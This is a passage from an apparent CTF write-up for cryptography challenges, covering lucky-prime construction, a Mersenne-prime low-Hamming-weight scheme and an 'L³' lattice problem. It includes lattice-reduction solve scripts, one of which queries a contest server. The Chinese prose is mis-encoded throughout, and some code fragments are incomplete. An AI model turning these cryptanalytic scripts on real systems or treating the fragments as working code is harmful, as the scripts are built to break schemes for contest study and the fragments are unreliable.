</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=s1>&#39; 2 Â· 7 Â· 9 Â· 79 Â· 2731 Â· 4057 Â· 8191 Â· 121369 Â· 22366891 Â· 6740339310641 Â· 10030854869257 Â· 4929910764223610387 Â· 4966300248405749059 Â· 18526238646011086732742614043 Â· 3340762283952395329506327023033 Â· 167510000247425697384594847173622455701743569339841261429683667Â·8342680841093063014359532631803433656669591074421858694040109486076573471951766107416262860801&#39;</span>
</span></span><span class=line><span class=cl><span class=n>factors</span> <span class=o>=</span> <span class=p>[</span><span class=nb>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>s</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;Â·&#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>isPrime</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>ps</span> <span class=ow>in</span> <span class=n>powerset</span><span class=p>(</span><span class=n>factors</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=n>prod</span><span class=p>(</span><span class=n>ps</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>is_prime</span><span class=p>(</span><span class=n>v</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>C</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>prod</span><span class=p>(</span><span class=n>ps</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>C</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>åŒç†åœ¨é€šè¿‡phiçš„ç´ å› å­åšä¸€ä¸ªéšæœºç»„åˆå¾—åˆ°n</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>is_lucky_modulus</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>:</span> <span class=n>p</span> <span class=o>!=</span> <span class=n>q</span> <span class=ow>and</span> <span class=n>is_lucky_prime</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=ow>and</span> <span class=n>is_lucky_prime</span><span class=p>(</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>=</span> <span class=p>[</span><span class=mi>19</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=n>xxx</span><span class=p>]</span><span class=c1># å»é™¤2ï¼Œ3.2æ˜¯ä¸€å®šéœ€è¦çš„ï¼Œ3æ˜¯ä¸€å®šä¸éœ€è¦çš„</span>
</span></span><span class=line><span class=cl><span class=n>dit</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>C</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>C</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=ow>in</span> <span class=n>dit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>dit</span><span class=p>[</span><span class=n>i</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>dit</span><span class=p>[</span><span class=n>i</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()]</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>dit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>C</span><span class=p>,</span><span class=n>k</span><span class=o>=</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>5</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span> <span class=o>=</span> <span class=n>reduce</span><span class=p>(</span><span class=k>lambda</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>:</span> <span class=n>a</span> <span class=o>*</span> <span class=n>b</span><span class=p>,</span> <span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>temp</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span><span class=o>&gt;</span><span class=mi>1024</span><span class=p>:</span><span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>low</span><span class=p>,</span><span class=n>high</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>1023</span><span class=o>//</span><span class=n>temp</span><span class=p>)</span><span class=o>.</span><span class=n>bit_length</span><span class=p>(),(</span><span class=mi>2</span><span class=o>**</span><span class=mi>1024</span><span class=o>//</span><span class=n>temp</span><span class=p>)</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>low</span><span class=p>,</span><span class=n>high</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>dit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>dit</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>temp1</span> <span class=o>=</span> <span class=n>temp</span><span class=o>*</span><span class=n>j</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>is_lucky_prime</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=n>temp1</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>((</span><span class=mi>2</span><span class=o>*</span><span class=n>temp1</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 126366417385482081632125709094422195763085260839280726740164612475634922264215045413877512640959314132187586716879561409141350180398416405619572141421522560637943964009554210789034269798922933667348876400327539861064015972617479878127021685556362985889939708226852813589758433391734452221720317317879861645259</span>
</span></span><span class=line><span class=cl><span class=c1># 151974134283935133352420140651526474538548682010699934815033216140905302768143230133430556352882687267987873313578681017377217259032440048007955628689170671694683741633721001403202878128665495512534319682836729961494276461120603551226499672239779728136264935129191088698434836072763401447684000861562852767379</span>
</span></span><span class=line><span class=cl><span class=c1># 106312089628793849062763337995024706937792152772069990672450023530583677738560813825597909857977982025524197288970637855162732583840554342767800584850797419457546950034663390577782967179012861468463694781815886302442867373996009972323299453999920718059621113399549466447947193549531131615015163546047741227827</span>
</span></span><span class=line><span class=cl><span class=c1># 140646306779911236718100133345672526392582055647788058291509942224041198448052411163408694927566949009305647384291001717328802708260579523859117526078577710848945020201292305928651597199282635108376461842318627821309798059469913133091889616376641944238299416259355290939717393034960368973288667712851402681787</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mersenne>Mersenne</h2><p>éšæœºæ•°ç”Ÿæˆå™¨å‡½æ•°ï¼ˆrandom(n,w)ï¼‰ç”Ÿæˆçš„éšæœºæ•°æ˜¯næ¯”ç‰¹ï¼Œæ±‰æ˜æƒé‡ä¸ºwçš„æ•°ã€‚è¿™é‡Œwä¸º12ï¼Œnè¾ƒå¤§ã€‚æ‰€ä»¥æ•´ä½“éšæœºæ•°æ±‰æ˜æƒé‡å¾ˆå°ã€‚</p><p>$$c=t*(a*h+b)\h=g^{-1}*f\mod p$$</p><p>f,gæ•°è¾ƒå°ï¼Œå¯ä»¥ç”¨$$M=\begin{pmatrix}h&amp;1\p&amp;0\end{pmatrix}$$è¿˜åŸg,fã€‚æ‰€ä»¥æ”¹å†™ä¸Šè¿°ç¬¬ä¸€ä¸ªç­‰å¼$$g<em>c=t</em>(a<em>f+b</em>g)\mod p$$.</p><p>tä¸º-1ï¼Œ1çš„å¾…æ±‚å˜é‡ã€‚g,f,a,bå‡ä¸ºrandomç”Ÿæˆçš„ä½æ±‰æ˜æƒé‡éšæœºæ•°ã€‚</p><p>ç”±äºpæ˜¯æ¢…æ£®ç´ æ•°ã€‚æ‰€ä»¥æœ‰$$2^k\mod p=2^{k-607};k>607$$ã€‚ä¹Ÿå°±æ˜¯ç»è¿‡modè¿ç®—ä¸æ”¹å˜æ±‰æ˜æƒé‡ã€‚</p><p>æ‰€ä»¥a<em>fï¼Œb</em>gä¸è€ƒè™‘è¿›ä½çš„æƒ…å†µä¸‹æœ€å¤§å‡æœ‰12*12=144ä¸ª1ï¼ŒåšåŠ æ³•æœ€å¤§æœ‰288ä¸ª1ã€‚åœ¨è¿›ä½çš„æƒ…å†µä¸‹åŸºæœ¬ä¸Šæ˜¯230å·¦å³çš„æ±‰æ˜æƒé‡ã€‚ä»¥æ­¤åˆ¤æ–­tã€‚</p><p>ç”±äºç¬¬ä¸€æ­¥è¿˜åŸg,fæœ‰å°æ¦‚ç‡å¤±è´¥ï¼Œæ‰€ä»¥å…ˆç”¨*å ä½ï¼Œæ‰€ä»¥å¤šå¾—åˆ°å‡ æ¬¡ç»“æœï¼Œå–å¹¶é›†å¾—åˆ°flagã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># -*- coding utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># @Time : 2024/5/26 15:37</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;123.60.161.30&#39;</span><span class=p>,</span><span class=mi>10089</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>2</span><span class=o>**</span><span class=mi>607</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>c</span><span class=p>),</span><span class=nb>eval</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,[[</span><span class=n>h</span><span class=p>,</span><span class=mi>1</span><span class=p>],[</span><span class=n>p</span><span class=p>,</span><span class=mi>0</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>        <span class=n>R</span> <span class=o>=</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=p>,</span><span class=n>g</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]),</span><span class=nb>abs</span><span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>sum</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>bin</span><span class=p>(</span><span class=n>f</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]])</span> <span class=o>==</span> <span class=mi>12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>sum</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>bin</span><span class=p>((</span><span class=n>g</span><span class=o>*</span><span class=n>c</span><span class=p>)</span><span class=o>%</span><span class=n>p</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]])</span><span class=o>&lt;</span><span class=mi>260</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;*&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(long_to_bytes(int(flag,2)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>flag1</span> <span class=o>=</span> <span class=s1>&#39;010100100100001101010100010001100111101100110010011000110011001001100010011001000011011100110111001*0111001011010011011100110001001100000110011000101101001101000*100010001101000011001100101101011000100011001101100100011000110010110100110000001100000110000101100100011000100110001101100011011001000011100100110011001101110011011101111101&#39;</span>
</span></span><span class=line><span class=cl><span class=n>flag2</span> <span class=o>=</span> <span class=s1>&#39;01010010010000110101010*0100011*0111101100110010011000110011001001100010011001000011011100*1011100110111001011010*1*01*1001100010011000001100110001011010011010001100010001*01000011001100101*0101100010001100110110*10001*00011001*110*00110000001100000110000101*00*000110001001100011011*0011011001000011100100110011001101110011011101111101&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>j</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>flag2</span><span class=p>,</span><span class=n>flag1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span><span class=o>!=</span><span class=s1>&#39;*&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>+=</span><span class=n>j</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span><span class=mi>2</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=l>LÂ³</h2><p>ç®€å•åˆ†æé¢˜ç›®ï¼š</p><p>$$ g_i^{\text{otp}} \cdot \text{leak} \equiv g^{sk_1 \cdot es_1 + sk_2 \cdot es_2 + sk_3 \cdot es_3} \pmod{p} $$</p><p>$$g_i$$ä¸ºround_g,gä¸ºåŸå§‹çš„ç”Ÿæˆå…ƒ.$$es_i$$è¾ƒå°ã€‚</p><p>ç´ æ•°på…‰æ»‘ï¼Œdlpé—®é¢˜å¯è§£ã€‚éšæœºç”Ÿæˆä¸€ä¸ªåŸºå…ƒä½œä¸ºæ–°çš„ç”Ÿæˆå…ƒG</p><p>$$G^{s_i*otp+e_i}=G^{sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3}$$</p><p>$$s_i*otp+e_i=sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3$$</p><p>è¿™ä¸ªç­‰å¼åªæœ‰$$s_i,e_i$$å·²çŸ¥ã€‚è€ƒè™‘æ­£äº¤æ ¼ï¼Œå¾—åˆ°å‘é‡uã€‚æ»¡è¶³$$=0,=0$$ï¼›</p><p>åŒæ—¶ä½¿å¾—$$=0,=0,=0$$ã€‚</p><p>å³å…ˆé€šè¿‡æ­£äº¤æ ¼å¾—åˆ°uï¼Œç„¶åå–uçš„å³æ ¸çŸ©é˜µvï¼Œåœ¨è§„çº¦ä¸€ä¸‹å¾—åˆ°çŸ­å‘é‡esã€‚</p><p>ç”±äºes1è¾ƒå¤§520bit,es2,es3å‡ä¸º512bitã€‚</p><p>é€šè¿‡æµ‹è¯•çŸ©é˜µè¿ç®—v.T*x=esï¼Œå¾—åˆ°$$\begin{pmatrix}i&amp;0&amp;1\j&-1&-1\1&amp;0&amp;0\end{pmatrix}$$ï¼Œå³es2,es3å¯ä»¥ç›´æ¥ç”±vçš„ç®€å•çº¿æ€§ç»„åˆå¾—åˆ°ï¼Œes1åˆ™éœ€è¦çˆ†ç ´i,jã€‚ç»“æœæµ‹è¯•ä¸¤ç»„æ•°æ®å‘ç°i,jå‡ä¸º(-256,256)çš„èŒƒå›´ï¼Œå¯ä»¥çˆ†ç ´ã€‚</p><p>è¿˜åŸotpï¼š</p><p>æš‚ä»¤es1=v2,es2,es3å·²çŸ¥ã€‚æ±‚è§£es1,es2,es3ä¸‰ä¸ªå‘é‡çš„æ­£äº¤æ ¼u1ã€‚</p><p>å¾—åˆ°$$*otp+=0\mod (p-1)$$,å¾—åˆ°otpã€‚</p><p>é€šè¿‡å‰ç¼€RCTFçˆ†ç ´i,jåˆ¤æ–­es1å‘é‡ç¬¬32ä¸ªå­—èŠ‚æ˜¯å¦ä¸ç›®æ ‡ç›¸ç­‰ï¼Œæ¥ç¡®å®ši,jã€‚</p><p>Exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mh>0x1795712A13E07F7CCA7A0B09B33EE746414E48863BD7EE1BD0D883460828FE88516774E44AC3F0CE5DA045688C40844677DA6D38582AC7CF2C00E8724AD399059E9298BB1AD9834DAA0481765FFBB00FCA71BAD1E024F7193334D71755B0EEA1D1C761E11FB67C3B495F8D12720A59A8AAEC3F8A59BD6BC45C8C236A29B74CBE823BF9A816556F6DD79364A3E87B02028F9B35C5BC46EE597ABDC1A465B9F41353DD514AA5B91326EB4868BA1C3BC8B74F55DBEF6E59BCF896E15C8400CA6B695C368EF87CBD99FDD4D33F5889EE36A571240B16FFD76C0FAEB81E4550B8549193E88CF630D2422903D1AA08CA369FE0E79DD04F581B7DD8CB1D3F28F9EE2583B</span>
</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secrets</span> <span class=kn>import</span> <span class=n>randbelow</span><span class=p>,</span> <span class=n>token_bytes</span>
</span></span><span class=line><span class=cl><span class=n>Ls</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=mi>45271426195437984198148734130819758602633909815689072697478701620601435374673859115374977739381723399290678384412185045217122060295726959080235531506689431253052329409248991162086755435524236239059164372248760776929823125679997728474984060374726551469255675878559640618558013763390399453799698222302893713694848361621145466743475696742422956752275573833137869181667151612124053978279138459573664900264490229603163834249353694326197102808037601830972670908019774394079149810806591598567334118064953523756408265128194654597075018359473812617392872386329084774129433549345609748777264532420011155288544759753547510177100</span>
</span></span><span class=line><span class=cl><span class=n>afs</span> <span class=o>=</span> <span class=p>[</span><span class=n>discrete_log</span><span class=p>(</span><span class=n>G</span><span class=p>(</span><span class=n>gi</span><span class=p>),</span><span class=n>G</span><span class=p>(</span><span class=n>g</span><span class=p>))</span> <span class=k>for</span> <span class=n>gi</span> <span class=ow>in</span> <span class=n>gs</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>hs</span> <span class=o>=</span> <span class=p>[</span><span class=n>discrete_log</span><span class=p>(</span><span class=n>G</span><span class=p>(</span><span class=n>li</span><span class=p>),</span><span class=n>G</span><span class=p>(</span><span class=n>g</span><span class=p>))</span> <span class=k>for</span> <span class=n>li</span> <span class=ow>in</span> <span class=n>Ls</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span><span class=mi>74</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>72</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>afs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>hs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>rescale_col</span><span class=p>(</span><span class=mi>72</span><span class=p>,</span><span class=mi>2</span><span class=o>^</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>rescale_col</span><span class=p>(</span><span class=mi>73</span><span class=p>,</span><span class=mi>2</span><span class=o>^</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ortm</span> <span class=o>=</span> <span class=n>res</span><span class=p>[:</span><span class=o>-</span><span class=mi>2</span><span class=p>,:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ortm</span> <span class=o>=</span> <span class=n>ortm</span><span class=p>[:</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># æµ‹è¯•å‘ç°åä¸‰ç»„ä¸æ»¡è¶³ä¸esæ­£äº¤æ‰€ä»¥å»é™¤</span>
</span></span><span class=line><span class=cl><span class=n>es</span> <span class=o>=</span> <span class=n>ortm</span><span class=o>.</span><span class=n>right_kernel_matrix</span><span class=p>()</span><span class=o>.</span><span class=n>BKZ</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>v1</span> <span class=o>=</span> <span class=o>-</span><span class=n>es</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v2</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>es</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v0</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span><span class=mi>75</span><span class=p>)</span>
